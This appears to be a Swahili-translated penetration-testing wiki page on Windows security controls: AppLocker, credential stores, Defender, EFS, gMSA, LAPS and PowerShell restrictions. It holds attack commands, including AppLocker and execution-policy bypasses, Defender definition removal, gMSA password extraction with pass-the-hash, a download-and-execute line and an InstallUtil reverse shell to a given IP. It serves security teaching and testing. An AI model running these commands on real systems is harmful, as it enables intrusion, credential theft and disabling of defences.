# Vidhibiti vya Usalama vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha iliyoruhusiwa ya programu ni orodha ya programu au faili zinazoweza kutekelezwa zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na programu zisizoidhinishwa ambazo haziendani na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la Microsoft la kuruhusu programu zilizoorodheshwa** na huwapa wasimamizi wa mfumo uwezo wa kudhibiti **programu na faili ambazo watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** wa faili zinazoweza kutekelezwa, scripts, faili za Windows installer, DLLs, programu zilizofungashwa na installers za programu zilizofungashwa.\
Ni jambo la kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na ufikiaji wa kuandika kwenye saraka fulani, **lakini yote haya yanaweza kukwepwa**.

### Kagua

Angalia ni faili/viongezi vipi vimeorodheshwa kama vilivyopigwa marufuku/vilivyoruhusiwa:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Njia hii ya registry ina mipangilio na sera zinazotumiwa na AppLocker, hivyo inatoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Folda zenye ruhusa ya kuandikika** zinazoweza kusaidia kukwepa Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **folda zenye ruhusa ya kuandikika** unazoweza kutumia **kukwepa hili**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) zinazochukuliwa kuwa **trusted** mara nyingi zinaweza pia kutumika kukwepa AppLocker.
- **Rules zilizoandikwa vibaya pia zinaweza kukwepwa**
  - Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder inayoitwa `allowed`** popote, na itaruhusiwa.
  - Mashirika pia mara nyingi huzingatia **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau **maeneo mengine** ya [**PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **Utekelezaji wa DLL mara chache sana huwashwa** kutokana na mzigo wa ziada unaoweza kuweka kwenye mfumo, na kiasi cha majaribio kinachohitajika kuhakikisha kuwa hakuna kitakachoharibika. Kwa hiyo, kutumia **DLLs kama backdoors kutasaidia kukwepa AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** code ya Powershell katika process yoyote na kukwepa AppLocker. Kwa maelezo zaidi, angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Hifadhi ya Sifa za Kuingia

### Security Accounts Manager (SAM)

Sifa za kuingia za ndani zipo kwenye faili hii; nywila zimehashiwa.

### Local Security Authority (LSA) - LSASS

**Sifa za kuingia** (zilizohashiwa) **huhifadhiwa** kwenye **memory** ya mfumo huu mdogo kwa sababu za Single Sign-On.\
**LSA** husimamia **sera ya usalama** ya ndani (sera ya nywila, ruhusa za watumiaji...), **uthibitishaji**, **access tokens**...\
LSA ndiyo **itakayokagua** sifa za kuingia zilizotolewa ndani ya faili ya **SAM** (kwa kuingia kwenye akaunti ya ndani) na **kuwasiliana** na **domain controller** ili kuthibitisha mtumiaji wa domain.

**Sifa za kuingia** **huhifadhiwa** ndani ya **process ya LSASS**: tiketi za Kerberos, hashes za NT na LM, nywila ambazo ni rahisi kufumbua.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya sifa za kuingia kwenye diski:

- Nywila ya akaunti ya kompyuta ya Active Directory (domain controller isiyofikika).
- Nywila za akaunti za huduma za Windows
- Nywila za kazi zilizoratibiwa
- Zaidi (nywila za programu za IIS...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu kwenye Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana kwenye Windows 10 na Windows 11, na kwenye matoleo ya Windows Server. **Huzuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kukwepa ulinzi huu**.

### Kukagua

Ili kukagua **hali** ya **Defender**, unaweza kutekeleza cmdlet ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** ili kujua kama imewashwa):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kuiorodhesha, unaweza pia kuendesha:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Mfumo wa Faili Uliosimbwa kwa Usimbaji (EFS)

EFS hulinda faili kwa kuzisimba kwa usimbaji, kwa kutumia **ufunguo wa ulinganifu** unaojulikana kama **File Encryption Key (FEK)**. Ufunguo huu husimbwa kwa kutumia **ufunguo wa umma** wa mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya faili iliyosimbwa kwa usimbaji. Usimbuaji unapohitajika, **ufunguo binafsi** unaolingana na cheti cha dijitali cha mtumiaji hutumiwa kufungua FEK kutoka kwenye mtiririko wa $EFS. Maelezo zaidi yanapatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Hali za usimbuaji bila mtumiaji kuanzisha** ni pamoja na:

- Faili au folda zinapohamishwa hadi kwenye mfumo wa faili usiotumia EFS, kama vile [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), hufunguliwa usimbuaji kiotomatiki.
- Faili zilizosimbwa kwa usimbaji zinazotumwa kupitia mtandao kwa kutumia itifaki ya SMB/CIFS hufunguliwa usimbuaji kabla ya kutumwa.

Mbinu hii ya usimbaji huruhusu mmiliki **kufikia faili zilizosimbwa kwa usimbaji moja kwa moja**. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia hakutamwezesha kufungua usimbuaji.

**Mambo Muhimu**:

- EFS hutumia FEK ya ulinganifu, ambayo husimbwa kwa kutumia ufunguo wa umma wa mtumiaji.
- Usimbuaji hutumia ufunguo binafsi wa mtumiaji kufikia FEK.
- Usimbuaji hufunguliwa kiotomatiki katika hali fulani, kama vile kunakili faili hadi FAT32 au kuzituma kupitia mtandao.
- Mmiliki anaweza kufikia faili zilizosimbwa kwa usimbaji bila hatua za ziada.

### Kukagua taarifa za EFS

Kagua ikiwa **mtumiaji** **ametumia** **huduma hii** kwa kuangalia kama njia hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kagua **ni nani** **anayeweza kufikia** faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimba kwa usimbaji** na **kufungua usimbuaji** wa faili zote

### Kufungua usimbuaji wa faili za EFS

#### Kuwa Authority System

Njia hii inahitaji **mtumiaji mlengwa** awe **anaendesha** **mchakato** ndani ya host. Ikiwa ndivyo, unaweza kutumia session za `meterpreter` kuiga tokeni ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu kutumia `migrate` kuhamia kwenye mchakato wa mtumiaji.

#### Kujua nenosiri la mtumiaji

Mimikatz inaeleza jinsi ya kuingiza cheti/nyenzo za ufunguo binafsi za mtumiaji na kufungua usimbuaji wa faili zilizolindwa na EFS wakati nenosiri linajulikana.<sup>[[6]](#references)</sup>

## Akaunti za Huduma Zinazosimamiwa na Kikundi (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya TEHAMA. Tofauti na akaunti za kawaida za huduma ambazo mara nyingi huwa na mpangilio wa "**Password never expire**", gMSA hutoa suluhisho salama na rahisi zaidi kusimamia:

- **Usimamizi wa Nenosiri Kiotomatiki**: gMSA hutumia nenosiri changamano lenye herufi 240, ambalo hubadilika kiotomatiki kulingana na sera ya domain au kompyuta. Mchakato huu hushughulikiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la kusasisha nenosiri mwenyewe.
- **Usalama Ulioimarishwa**: Akaunti hizi haziathiriwi na kufungiwa na haziwezi kutumiwa kuingia kwa njia shirikishi, hivyo kuimarisha usalama wake.
- **Usaidizi kwa Host Nyingi**: gMSA zinaweza kushirikiwa kati ya host nyingi, na kuzifanya zifae kwa huduma zinazoendeshwa kwenye seva nyingi.
- **Uwezo wa Kazi Zilizopangwa**: Tofauti na akaunti za huduma zinazosimamiwa, gMSA zinaweza kuendesha kazi zilizopangwa.
- **Usimamizi Rahisi wa SPN**: Mfumo husasisha kiotomatiki Service Principal Name (SPN) kunapotokea mabadiliko kwenye maelezo ya sAMaccount au jina la DNS la kompyuta, na hivyo kurahisisha usimamizi wa SPN.

Nenosiri za gMSA huhifadhiwa kwenye sifa ya LDAP _**msDS-ManagedPassword**_ na huwekwa upya kiotomatiki kila baada ya siku 30 na Domain Controllers (DCs). Nenosiri hili, ambalo ni blob ya data iliyosimbwa kwa usimbaji inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), linaweza kurejeshwa tu na wasimamizi walioidhinishwa na seva ambazo gMSA zimewekwa juu yake, hivyo kuhakikisha mazingira salama. Ili kufikia taarifa hii, muunganisho salama kama LDAPS unahitajika, au muunganisho lazima uthibitishwe kwa kutumia 'Sealing & Secure'.

![Kuelekeza upya uthibitishaji wa NTLM ili kupata nenosiri la gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Unaweza kusoma nenosiri hili kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Pata maelezo zaidi katika utafiti asilia uliohifadhiwa kwenye kumbukumbu**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Utafiti huo huo unaeleza jinsi **NTLM relay attack** inavyoweza kupata **gMSA password** ikiwa principal inayorelayiwa imeidhinishwa kusoma `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Kutumia vibaya uunganishaji wa ACL kusoma gMSA managed password (GenericAll -> ReadGMSAPassword)

Katika mazingira mengi, watumiaji wenye haki ndogo wanaweza kupata siri za gMSA bila kuathiri DC kwa kutumia vibaya ACL za objekti zilizosanidiwa vibaya:<sup>[[3]](#references)</sup>

- Kikundi unachoweza kudhibiti (kwa mfano, kupitia GenericAll/GenericWrite) kimepewa `ReadGMSAPassword` kwa gMSA.
- Kwa kujiongeza kwenye kikundi hicho, unapata haki ya kusoma blob ya `msDS-ManagedPassword` ya gMSA kupitia LDAP na kupata NTLM credentials zinazoweza kutumika.

Mtiririko wa kawaida wa kazi:

1) Gundua njia hiyo kwa kutumia BloodHound na uweke alama ya Owned kwa principals ulizopata foothold nazo. Tafuta edges kama:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Jiongeze kwenye kikundi cha kati unachodhibiti (mfano kwa kutumia bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Soma nenosiri linalodhibitiwa la gMSA kupitia LDAP na utoe NTLM hash. NetExec huendesha kiotomatiki uchimbaji wa `msDS-ManagedPassword` na ubadilishaji wake kuwa NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Thibitisha utambulisho kama gMSA kwa kutumia NTLM hash (hakuna plaintext inayohitajika). Ikiwa akaunti iko kwenye Remote Management Users, WinRM itafanya kazi moja kwa moja:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Notes:
- Usomaji wa `msDS-ManagedPassword` kupitia LDAP unahitaji sealing (mfano, LDAPS/sign+seal). Tools hushughulikia hili kiotomatiki.
- gMSA mara nyingi hupewa haki za ndani kama WinRM; thibitisha uanachama wa group (mfano, Remote Management Users) ili kupanga lateral movement.
- Ikiwa unahitaji blob pekee ili kujihesabia NTLM, tazama muundo wa MSDS-MANAGEDPASSWORD_BLOB.

Njia nyingine ya ACL ni ruhusa ya kuandika kwenye object ya gMSA yenyewe. `msDS-GroupMSAMembership` ni security descriptor inayotumika kuamua ni principals gani zinaweza kupata password inayosimamiwa. GUID ya schema yake ni `888eedd6-ce04-df40-b462-b8a50e41ba38`. ACE mahususi ya `WriteProperty` kwenye attribute hiyo kwa group unayoidhibiti inaweza kuwa njia ya kubadilisha orodha ya wasomaji; hii ni tofauti na kuwa tayari kwenye orodha ya wasomaji. Thibitisha DACL nzima, deny na inherited ACEs, pamoja na ruhusa zinazotumika kabla ya kuchukulia njia hiyo kuwa inaweza kutumika. Uanachama mpya wa group pia unahitaji token/session iliyosasishwa kabla ya kujaribu kusoma password.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, inayoweza kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa password za Administrator wa ndani. Password hizi, ambazo ni **za nasibu**, za kipekee na **hubadilishwa mara kwa mara**, huhifadhiwa katikati kwenye Active Directory. Ufikiaji wa password hizi huzuiwa kupitia ACLs kwa watumiaji walioidhinishwa. Ruhusa za kutosha zikipewa, mtumiaji anaweza kusoma password za admin wa ndani.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **huzuia vipengele vingi** vinavyohitajika ili kutumia PowerShell kikamilifu, kama vile kuzuia COM objects, kuruhusu tu aina za .NET zilizoidhinishwa, workflows zinazotumia XAML, PowerShell classes na mengineyo.

### **Check**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Katika matoleo ya sasa ya Windows, bypass hiyo haifanyi kazi tena, lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompile, huenda ukahitaji** **kwenda** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> kuongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **kubadilisha project iwe .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) **kutekeleza** msimbo wa Powershell katika mchakato wowote na kufanya bypass ya constrained mode. Kwa maelezo zaidi, angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Sera ya Utekelezaji wa PS

Kwa chaguomsingi, imewekwa kuwa **restricted.** Njia kuu za kufanya bypass ya sera hii:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Zaidi inaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumiwa kuthibitisha utambulisho wa watumiaji.

SSPI huchagua itifaki inayofaa ya uthibitishaji kwa mashine mbili zinazowasiliana, na hupendelea Kerberos inapopatikana. Itifaki hizi hutekelezwa na Security Support Providers (SSPs), ambazo husakinishwa kama DLL kwenye Windows; pande zote mbili lazima ziunge mkono provider iliyokubaliwa.

### SSP kuu

- **Kerberos**: Inayopendelewa
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za uoanifu
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Kwa seva za wavuti na LDAP, nenosiri likiwa katika mfumo wa MD5 hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kujadiliana kuhusu itifaki ya kutumia (Kerberos au NTLM, huku Kerberos ikiwa chaguo-msingi)
  - %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa mbinu kadhaa au moja tu.

<a id="uac"></a>

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kidokezo cha idhini kwa shughuli zinazohitaji mamlaka ya juu**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relay kwa gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA kupitia mnyororo wa ruhusa hadi WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Kukwepa AppLocker na PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – Njia 15 za Kukwepa Sera ya Utekelezaji ya PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ kusimbua faili za EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - sifa ya ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
